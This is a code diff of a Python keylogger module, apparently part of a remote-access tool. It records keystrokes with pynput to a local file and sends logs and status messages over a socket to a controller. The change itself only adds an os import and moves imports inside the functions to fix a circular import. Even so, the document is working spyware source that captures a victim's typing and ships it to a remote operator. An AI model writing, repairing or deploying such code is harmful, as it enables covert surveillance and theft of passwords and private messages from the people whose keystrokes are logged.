@@ -1,12 +1,12 @@
 import threading
 import time
+import os
 try:
     from pynput import keyboard
 except ImportError:
     keyboard = None
     print("[-] pynput library not found. Keylogger functionality will fail. Run: pip install pynput")
 from .file_transfer import upload_file
-from ..communication import send_data
 
 keylogger_listener = None
 keylog_file_name = "client_keylog.txt"
@@ -46,6 +46,7 @@ def keylogger_thread_func():
     print("Keylogger listener thread finished.")
 
 def start_keylogger(sock):
+    from ..communication import send_data  # Import inside the function to avoid circular import
     global keylogger_listener
     if keylogger_listener and keylogger_listener.is_alive():
         send_data(sock, {"status": "info", "message": "Keylogger is already running."})
@@ -59,6 +60,7 @@ def start_keylogger(sock):
     send_data(sock, {"status": "success", "message": "Keylogger started."})
 
 def stop_keylogger(sock):
+    from ..communication import send_data  # Import inside the function to avoid circular import
     global keylogger_listener
     if not (keylogger_listener and keylogger_listener.is_alive()):
         send_data(sock, {"status": "info", "message": "Keylogger is not running or already stopped."})
@@ -70,6 +72,7 @@ def stop_keylogger(sock):
     send_data(sock, {"status": "success", "message": "Keylogger stop signal sent."})
 
 def send_keylogs(sock):
+    from ..communication import send_data  # Import inside the function to avoid circular import
     if not os.path.exists(keylog_file_name):
         send_data(sock, {"status": "error", "message": "Keylog file not found."})
         return
